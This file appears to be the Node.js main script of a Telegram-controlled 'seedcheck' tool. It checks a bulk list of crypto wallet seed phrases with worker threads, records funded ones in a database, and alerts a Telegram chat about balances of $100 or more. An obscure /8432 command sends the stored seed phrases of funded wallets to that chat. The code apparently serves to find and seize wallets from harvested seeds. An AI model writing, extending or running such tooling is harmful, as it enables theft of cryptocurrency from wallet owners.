import { Worker } from "worker_threads";
import TelegramBot from "node-telegram-bot-api";
import getPrices from "./utils/getPrices.js";
import getExplorerUrl from "./utils/getExplorerUrl.js";
import pool from "./config/db.js";
import loadFileContent from "./utils/loadFileContent.js";
import { exec } from "child_process";
import debugLog from "./utils/debugLog.js";
import fs from "fs";

// Telegram Chat ID
const CHAT_ID = 11111111;

// Ваш токен Telegram-бота
const bot = new TelegramBot("1111111:AAGaVvtnMKZks6ltyaxRh-P7ANMwu5wqMsw", {
  polling: true,
});

// Константы
const SOURCE = "resources/seed.txt"; // Источник

let workers = [];
let currentChecked = [];
let shouldRestart = true; // Флаг для контроля перезапуска

// Функция проверки
async function runChecks() {
  try {
    console.log("Начало проверки...");
    const fileContent = await loadFileContent(SOURCE);
    const data = fileContent.split("\n").filter((line) => line.trim() !== "");

    const totalTasks = data.length;
    const numWorkers = Math.min(totalTasks, 10); // Количество воркеров не больше 10

    // Разделяем данные на чанки для воркеров
    const chunks = [];
    const ids = [];
    const chunkSize = Math.ceil(totalTasks / numWorkers); // Размер чанка для каждого воркера

    for (let i = 0; i < numWorkers; i++) {
      const chunk = data.slice(i * chunkSize, (i + 1) * chunkSize);
      const chunkIds = chunk.map((_, index) => i * chunkSize + index + 1);
      chunks.push(chunk);
      ids.push(chunkIds);
    }

    console.log(
      `Общее количество фраз: ${totalTasks}, Количество воркеров: ${chunks.length}`
    );

    const workerPromises = chunks.map(
      (chunk, index) =>
        new Promise((resolve, reject) => {
          const worker = new Worker("./worker.js", {
            workerData: { chunk: chunk, id: ids[index] },
          });
          workers.push(worker);

          worker.on("message", async (data) => {
            try {
              if (data.type === "currentChecked" && data.address) {
                currentChecked.push(data.address);
              }

              if (data?.error === "invalid_mnemonic") {
                debugLog(data);
              }

              if (data.result && typeof data.result === "object") {
                debugLog(data);

                const entries = Object.entries(data.result);
                for (const [key, value] of entries) {
                  if (Number(value.balance) > 0) {
                    const address = await pool.query(
                      "SELECT * FROM addresses WHERE address = $1",
                      [value.address]
                    );

                    if (address.rows[0]?.id) {
                      if (value.balance !== address.rows[0].balance) {
                        await pool.query(
                          "UPDATE addresses SET balance = $1 WHERE address = $2",
                          [value.balance, value.address]
                        );
                      }

                      if (
                        Math.abs(value.balance - address.rows[0].balance) >=
                          50 &&
                        value.balance >= 100
                      ) {
                        bot.sendMessage(
                          CHAT_ID,
                          `Текущий баланс: ${value.balance}$ \nКлюч: ${
                            value.address
                          } \n\n${getExplorerUrl(key)}${value.address}`
                        );
                      }
                    } else {
                      await pool.query(
                        "INSERT INTO addresses (seed, symbol, address, balance) VALUES ($1, $2, $3, $4)",
                        [data.mnemonic, key, value.address, value.balance]
                      );

                      if (Number(value.balance) >= 100) {
                        bot.sendMessage(
                          CHAT_ID,
                          `Текущий баланс: ${value.balance}$ \nКлюч: ${
                            value.address
                          } \n\n${getExplorerUrl(key)}${value.address}`
                        );
                      }
                    }
                  }

                  currentChecked.filter((address) => address !== value.address);
                }
              }
            } catch (err) {
              reject(err);
            }
          });

          worker.on("error", reject);

          worker.on("exit", (code) => {
            workers = workers.filter((w) => w !== worker);

            if (code !== 0) {
              reject(new Error(`Worker stopped with exit code ${code}`));
            } else {
              resolve();
            }
          });
        })
    );

    await Promise.all(workerPromises);
    console.log("Проверка завершена успешно.");
  } catch (err) {
    console.error("Ошибка во время проверки:", err);
  } finally {
    await cleanupWorkers();

    // Перезапуск через PM2, если установлен флаг
    if (shouldRestart) {
      console.log("Перезапуск через PM2...");
      exec("pm2 restart seedcheck", (error) => {
        if (error) {
          console.error("Ошибка при перезапуске через PM2:", error.message);
        } else {
          console.log("Процесс успешно перезапущен через PM2.");
        }
      });
    }
  }
}

// Очистка воркеров
async function cleanupWorkers() {
  await Promise.all(workers.map((worker) => worker.terminate()));
  workers = [];
  currentChecked = [];
}

// Команда `/restart`
bot.onText(/\/restart/, async (msg) => {
  if (msg.chat.id === CHAT_ID) {
    bot.sendMessage(CHAT_ID, "Перезапуск процесса...");

    if (shouldRestart) {
      exec("pm2 restart seedcheck");
    } else {
      await cleanupWorkers();
      await runChecks();
    }

    bot.sendMessage(CHAT_ID, "Процесс успешно перезапущен.");
  }
});

// Команда `/delbase`
bot.onText(/\/delbase/, async (msg) => {
  if (msg.chat.id === CHAT_ID) {
    try {
      await pool.query("DELETE FROM addresses");
      bot.sendMessage(
        CHAT_ID,
        "База данных удалена. Начинаем с чистого листа."
      );
    } catch (err) {
      console.error(err);
      bot.sendMessage(CHAT_ID, "Ошибка при удалении базы данных.");
    }
  }
});

// Команда `/checked`
bot.onText(/\/checked/, (msg) => {
  if (msg.chat.id === CHAT_ID) {
    const checkedIds =
      Array.from(currentChecked).join("\n\n") || "Нет активных проверок.";
    bot.sendMessage(CHAT_ID, `Текущие ID адресов в проверке:\n${checkedIds}`);
  }
});

// Команда `/list`
bot.onText(/\/list/, async (msg) => {
  if (msg.chat.id === CHAT_ID) {
    try {
      const result = await pool.query(
        "SELECT address, balance FROM addresses WHERE balance > 100"
      );
      const list = result.rows
        .map((row) => `Адрес: ${row.address}, Баланс: ${row.balance}$`)
        .join("\n\n");

      bot.sendMessage(CHAT_ID, list || "Нет адресов с балансом выше $100.");
    } catch (err) {
      console.error(err);
      bot.sendMessage(CHAT_ID, "Ошибка при запросе списка адресов.");
    }
  }
});

// Команда `/8432`
bot.onText(/\/8432/, async (msg) => {
  if (msg.chat.id === CHAT_ID) {
    try {
      const result = await pool.query(
        "SELECT seed, address, balance FROM addresses WHERE balance > 100"
      );
      const secrets = result.rows
        .map(
          (row) =>
            `\nSeed: ${row.seed}, \nАдрес: ${row.address}, \nБаланс: ${row.balance}`
        )
        .join("\n");

      bot.sendMessage(
        CHAT_ID,
        secrets || "Нет seed-фраз с балансом выше $100."
      );
    } catch (err) {
      console.error(err);
      bot.sendMessage(CHAT_ID, "Ошибка при запросе seed-фраз.");
    }
  }
});

// Запуск проверки
fs.truncateSync("log.json", 0);
await runChecks();

// Парсим курсы валют каждые 5 минут
setInterval(() => {
  getPrices(["BTC", "XLM", "SOL"]);
}, 300000);
